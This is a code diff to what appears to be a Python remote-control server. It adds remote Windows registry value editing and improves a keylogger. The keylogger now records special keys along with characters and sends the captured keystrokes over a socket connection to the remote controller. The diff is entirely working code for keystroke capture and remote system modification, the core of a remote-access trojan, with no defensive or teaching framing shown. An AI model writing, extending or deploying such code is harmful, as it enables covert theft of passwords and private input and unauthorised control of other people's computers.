@@ -29,6 +29,21 @@ server.bind((SERVER, PORT))
 
 keylogger_on = False
 
+def toReg(str):
+    if(str == "String"):
+        return wr.REG_SZ
+    if(str == "Binary"):
+        return wr.REG_BINARY
+    if(str == "DWORD"):
+        return wr.REG_DWORD
+    if(str == "QWORD"):
+        return wr.REG_QWORD
+    if(str == "Multi-String"):
+        return wr.REG_MULTI_SZ
+    if(str == "Expandable String"):
+        return wr.REG_EXPAND_SZ
+    
+
 def send(connection, msg):
     message = msg.encode(FORMAT)
     msg_len = str(len(message)).encode(FORMAT) 
@@ -120,13 +135,13 @@ def analyzeRegistry(msg, connection):
         else: 
             send(connection, f'Cannot get value at path {content[1]}')
     elif content[0] == 'SETVAL':
-        returnVal = setValue(content[1], content[2], content[3], content[4])
+        returnVal = setValue(content[1], content[2], toReg(content[3]), content[4])
         if returnVal:
             send(connection, f'Value {content[2]} has been set to {content[4]}')
         else:
             send(connection, f'Error while setting value {content[2]}')
     elif content[0] == 'CREATEVAL':
-        returnVal = createValue(content[1], content[2], content[3], content[4])
+        returnVal = createValue(content[1], content[2], toReg(content[3]), content[4])
         if returnVal:
             send(connection, f'Created value {content[2]}')
         else:
@@ -222,11 +237,20 @@ def record_keys(connection, address):
     def on_press(key):
         nonlocal keys_pressed
         try:
-            keys_pressed.append(key.char)
+            keys_pressed.append((key.char).replace("Key.", ""))
         except AttributeError:
-            pass
-            # Special key (e.g., Shift, Ctrl, etc.)
-            # keys_pressed.append(f'<{key}>'.replace('Key.', ''))
+            # Handle special keys
+            if key == keyboard.Key.space:
+                key_char = '<SPACE>'
+            elif key == keyboard.Key.enter:
+                key_char = '<ENTER>'
+            elif isinstance(key, keyboard.KeyCode):
+                key_char = str(key.char).replace("Key.", "")
+                key_char = '<' + key_char + '>'
+            else:
+                key_char = str(key).replace("Key.", "")
+                key_char = '<' + key_char + '>'
+            keys_pressed.append(key_char)
     listener = keyboard.Listener(on_press=on_press)
     listener.start()
     while (keylogger_on):
@@ -234,6 +258,7 @@ def record_keys(connection, address):
     listener.stop()
 
     _keylogged = ''.join(keys_pressed)
+    print(_keylogged)
     send(connection, _keylogged)
 
 def getAppList():
